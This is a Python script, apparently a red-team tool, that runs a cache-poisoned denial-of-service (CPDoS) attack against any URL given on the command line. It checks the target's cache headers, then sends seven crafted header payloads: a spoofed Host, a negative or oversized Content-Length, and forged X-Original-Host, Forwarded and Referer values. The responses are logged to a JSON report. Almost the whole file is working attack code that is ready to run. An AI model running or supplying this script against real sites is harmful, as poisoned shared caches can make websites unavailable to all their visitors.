import sys
import time
import json
import requests

LOG_FILE = "cpdos_report.json"

# CPDoS Attack Payloads
CPDOS_PAYLOADS = [
    {"Host": "127.0.0.1", "Content-Length": "0"},
    {"Content-Length": "-1"},
    {"Host": "..", "Content-Length": "100"},
    {"X-Original-Host": "bypass.cache", "Content-Length": "8"},
    {"Cache-Control": "no-store", "Content-Length": "100"},
    {"Referer": "http://malicious.site", "Content-Length": "10"},
    {"Forwarded": "for=127.0.0.1;by=cache-poison", "Content-Length": "99999"},
]

BANNER = """
██████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██████╔╝██████╔╝██║  ███╗█████╗  
██╔═══╝ ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝     ╚═╝      ╚═════╝ ╚══════╝
   CPDoS Security Testing Tool - Red Team
"""

CACHE_HEADERS = ["X-Cache", "Via", "Age", "CF-Cache-Status", "X-CDN-Cache", "X-Proxy-Cache"]

def log_report(data):
    """Save scan and attack results to a structured report."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    data["timestamp"] = timestamp

    with open(LOG_FILE, "w") as log:
        json.dump(data, log, indent=4)

    print(f"[✔] Report saved to {LOG_FILE}")

def scan_cache_vulnerabilities(target):
    """Check for caching vulnerabilities before attacking."""
    print("[*] Scanning for cache vulnerabilities...")
    vulnerabilities = {}

    try:
        response = requests.get(target, timeout=10)  # Increased timeout
        vulnerable_headers = {header: response.headers.get(header, "Not Found") for header in CACHE_HEADERS}

        vulnerabilities["cache_headers"] = vulnerable_headers

        if any(value != "Not Found" for value in vulnerable_headers.values()):
            print("[✔] Caching detected! Possible vulnerabilities found.")
            for header, value in vulnerable_headers.items():
                print(f"    [+] {header}: {value}")
            vulnerabilities["status"] = "Potentially Vulnerable"
        else:
            print("[✘] No caching detected. Attack may not work.")
            vulnerabilities["status"] = "No Cache Detected"

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {e}")
        vulnerabilities["error"] = str(e)

    return vulnerabilities

def exploit_cpdos(target):
    """Exploit cache poisoning vulnerabilities using CPDoS payloads."""
    print("[*] Attempting CPDoS attack on detected vulnerabilities...")
    results = []
    for i, payload in enumerate(CPDOS_PAYLOADS):
        print(f"[*] Sending CPDoS Payload {i+1}: {json.dumps(payload)}")
        try:
            response = requests.get(target, headers=payload, timeout=10)  # Extended timeout
            response_details = {
                "payload": payload,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body_snippet": response.text[:200]  # Capture first 200 chars
            }
            results.append(response_details)
            print(f"[+] Response {i+1}: {response.status_code}, Headers Captured")
        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "error": str(e)
            })
            print(f"[ERROR] Payload {i+1} failed: {e}")
    return results

def main(target):
    print(BANNER)
    print(f"[+] Target: {target}")

    # Step 1: Scan for vulnerabilities
    cache_vulnerabilities = scan_cache_vulnerabilities(target)
    
    if cache_vulnerabilities.get("status") == "No Cache Detected":
        print("[✘] No cache vulnerabilities found. Exiting...")
        sys.exit(1)

    # Step 2: Launch CPDoS attack
    attack_results = exploit_cpdos(target)

    # Step 3: Generate Report
    report_data = {
        "target": target,
        "cache_scan": cache_vulnerabilities,
        "attack_results": attack_results
    }
    
    log_report(report_data)
    print("[✔] Attack complete. Check report for details.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python cpdos_tester.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    main(target_url)
